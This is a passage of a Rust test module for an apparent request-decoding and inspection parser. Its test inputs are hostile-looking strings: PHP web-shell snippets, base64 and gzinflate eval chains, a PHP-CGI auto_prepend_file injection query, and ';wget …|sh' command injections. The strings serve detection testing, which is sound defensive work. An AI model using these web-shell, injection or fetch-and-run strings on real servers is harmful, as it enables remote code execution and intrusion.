        for (n, v) in ["Qx7aB2", "m9Kd0e", "Zp3Lw8", "vN5tR1", "hY6cJ4"]
            .iter()
            .enumerate()
        {
            body.extend_from_slice(
                format!("--b\r\nContent-Disposition: form-data; name=\"pad_{n}\"\r\n\r\n{v}\r\n")
                    .as_bytes(),
            );
        }
        body.extend_from_slice(
            b"--b\r\nContent-Disposition: form-data; name=\"real\"\r\n\r\nkept\r\n--b--\r\n",
        );
        let x = request(None, Some(&body));
        let pads: Vec<&Layer> = x
            .layers
            .iter()
            .filter(|l| l.name.as_deref().is_some_and(|n| n.starts_with(b"pad_")))
            .collect();
        assert_eq!(pads.len(), 1);
        assert_eq!(pads[0].collapsed, 5);
        assert_eq!(pads[0].name.as_deref(), Some(&b"pad_0"[..]));
        assert!(find_layer(&x, LayerKind::MultipartField, b"kept").is_some());
    }

    #[test]
    fn json_strings_are_layers() {
        let x = request(
            None,
            Some(br#"{"a":"hello","b":["x y","z"],"c":{"d":"deep"}}"#),
        );
        for s in [&b"hello"[..], b"x y", b"z", b"deep"] {
            assert!(find_layer(&x, LayerKind::Json, s).is_some(), "{s:?}");
        }
        let hello = find_layer(&x, LayerKind::Json, b"hello").unwrap();
        assert_eq!(hello.name.as_deref(), Some(&b"a"[..]));
    }

    #[test]
    fn xml_text_is_a_layer() {
        let x = request(
            None,
            Some(br#"<?xml version="1.0"?><r><a>hi &amp; there</a><b x="attr val"><![CDATA[cd data]]></b></r>"#),
        );
        for s in [&b"hi & there"[..], b"attr val", b"cd data"] {
            assert!(find_layer(&x, LayerKind::Xml, s).is_some(), "{s:?}");
        }
    }

    #[test]
    fn php_block_is_a_layer() {
        let x = request(None, Some(b"junk <?php system($_GET['c']); ?> tail"));
        assert!(find_layer(&x, LayerKind::Php, b" system($_GET['c']); ").is_some());
    }

    #[test]
    fn php_base64_decode_call_opens_inner_text() {
        let x = request(
            None,
            Some(b"<?php eval(base64_decode('ZWNobyAiaGkiOw==')); ?>"),
        );
        assert!(find_layer(&x, LayerKind::Php, b"echo \"hi\";").is_some());
    }

    #[test]
    fn php_gzinflate_chain_opens() {
        let mut e = DeflateEncoder::new(Vec::new(), Compression::default());
        e.write_all(b"echo \"chain\";").unwrap();
        let packed = data_encoding::BASE64.encode(&e.finish().unwrap());
        let body = format!("<?php eval(gzinflate(base64_decode('{packed}'))); ?>");
        let x = request(None, Some(body.as_bytes()));
        assert!(find_layer(&x, LayerKind::Php, b"echo \"chain\";").is_some());
    }

    #[test]
    fn php_chr_run_opens() {
        let x = request(None, Some(b"<?php $f = chr(105).chr(100).chr(0x20); ?>"));
        assert!(find_layer(&x, LayerKind::Escapes, b"id ").is_some());
    }

    #[test]
    fn php_cgi_injection_is_a_layer() {
        let x = request(
            Some("%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"),
            Some(b"eval(base64_decode('ZWNobyAiaGkiOw=='));"),
        );
        assert!(x.layers.iter().any(|l| l.kind == LayerKind::PhpCgi));
        // The body is read as PHP in place, not copied.
        assert!(x.php_body);
        assert!(find_layer(&x, LayerKind::Php, b"echo \"hi\";").is_some());
        assert_eq!(
            x.layers.iter().filter(|l| l.kind == LayerKind::Php).count(),
            1
        );
    }

    #[test]
    fn php_body_is_marked_without_a_call() {
        let x = request(
            Some("%ADd+auto_prepend_file%3dphp://input"),
            Some(b"system('id');"),
        );
        assert!(x.php_body);
        assert_eq!(x.layers[0].text, b"system('id');");
        assert!(!request(None, Some(b"system('id');")).php_body);
    }

    #[test]
    fn base64_outside_a_php_block_opens() {
        let blob = data_encoding::BASE64.encode(b"Some hidden payload here");
        let body = format!("junk {blob} <?php echo 1; ?>");
        let x = request(None, Some(body.as_bytes()));
        assert!(has_text(&x, b"Some hidden payload here"));
    }

    #[test]
    fn multipart_preamble_is_decoded() {
        let blob = data_encoding::BASE64.encode(b"Some hidden payload here");
        let body = format!(
            "preamble {blob}\r\n--b\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nv\r\n--b--\r\n"
        );
        let x = request(None, Some(body.as_bytes()));
        assert!(has_text(&x, b"Some hidden payload here"));
    }

    #[test]
    fn numbered_fields_with_real_values_are_all_kept() {
        let x = request(None, Some(b"cmd0=ls&cmd1=id&cmd2=whoami"));
        for (n, v) in [("cmd0", "ls"), ("cmd1", "id"), ("cmd2", "whoami")] {
            let l = find_layer(&x, LayerKind::Form, v.as_bytes()).expect(v);
            assert_eq!(l.name.as_deref(), Some(n.as_bytes()));
            assert_eq!(l.collapsed, 0);
        }
    }

    #[test]
    fn numbered_fields_holding_base64_are_kept() {
        let b = data_encoding::BASE64.encode(b"wget http://example.org/x -O- | sh");
        let body = format!(
            "p0=Qx7aB2&p1=m9Kd0e&p2=Zp3Lw8&p3={}",
            b.trim_end_matches('=')
        );
        let x = request(None, Some(body.as_bytes()));
        assert!(has_text(&x, b"wget http://example.org/x -O- | sh"));
    }

    #[test]
    fn form_after_php_block_is_read() {
        let x = request(None, Some(b"cmd=<?php system($_GET[1]);?>&b=hello+there"));
        assert!(find_layer(&x, LayerKind::Form, b"hello there").is_some());
        assert!(x.layers.iter().any(|l| l.kind == LayerKind::Php));
    }

    #[test]
    fn query_without_equals_is_read() {
        let x = request(Some(";wget%20x|sh"), None);
        assert!(find_layer(&x, LayerKind::Form, b";wget x|sh").is_some());
        let x = request(Some("<?php system($_GET[1]); ?>"), None);
        assert!(x.layers.iter().any(|l| l.kind == LayerKind::Php));
    }

    #[test]
    fn base64_blob_in_php_opens_once() {
        let blob = data_encoding::BASE64.encode(b"echo 'one single layer here';");
        let body = format!("<?php eval(base64_decode('{blob}')); ?>");
        let x = request(None, Some(body.as_bytes()));
        let n = x
            .layers
            .iter()
            .filter(|l| l.text == b"echo 'one single layer here';")
            .count();
        assert_eq!(n, 1);
    }

    #[test]
    fn dropped_parts_are_marked() {
        let mut body = String::new();
        for n in 0..300 {
            body.push_str(&format!("f{n}x=v{n}&"));
        }
        body.push_str("last=payload");
        let x = request(None, Some(body.as_bytes()));
        assert!(x.opaque.iter().any(|o| o.reason == OpaqueReason::OverLimit));
    }

    #[test]
    fn json_repeated_keys_and_tails_are_read() {
        let x = request(
            None,
            Some(br#"{"a":"first payload","a":"second"} trailing "tail str""#),
        );
        assert!(find_layer(&x, LayerKind::Json, b"first payload").is_some());
        assert!(find_layer(&x, LayerKind::Json, b"tail str").is_some());
        let x = request(None, Some(br#""just a string""#));
        assert!(find_layer(&x, LayerKind::Json, b"just a string").is_some());
    }

    #[test]
    fn same_value_under_two_names_keeps_both_names() {
        let x = request(None, Some(b"a=same+value&b=same+value"));
        let names: Vec<_> = x
            .layers
            .iter()
            .filter(|l| l.text == b"same value")
            .collect();
        assert_eq!(names.len(), 2);
    }

    #[test]
    fn multipart_tail_that_is_not_the_boundary_stays() {
        let body =
            b"--b\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nline\r\n--x\r\n--b--\r\n";
        let x = request(None, Some(body));
        assert!(find_layer(&x, LayerKind::MultipartField, b"line\r\n--x").is_some());
    }

    #[test]
    fn upload_text_is_read_and_named() {
        let x = parse(
            Source::Upload {
                name: Some("shell.php"),
                text: b"<?php exec('id'); ?>",
                sender: None,
            },
            Policy::embedded(),
        );
        assert_eq!(x.layers[0].name.as_deref(), Some(&b"shell.php"[..]));
        assert!(has_text(&x, b" exec('id'); "));
    }

    #[test]
    fn layers_respect_the_budget() {
        let strings: Vec<String> = (0..400).map(|n| format!("\"value number {n}\"")).collect();
        let body = format!("[{}]", strings.join(","));
        let x = request(None, Some(body.as_bytes()));
        assert!(x.layers.len() <= super::super::MAX_LAYERS);
        assert!(x.layers.len() > 100);
    }

    #[test]
    fn empty_request_is_one_layer() {
        assert_eq!(request(None, None).layers.len(), 1);
    }
}
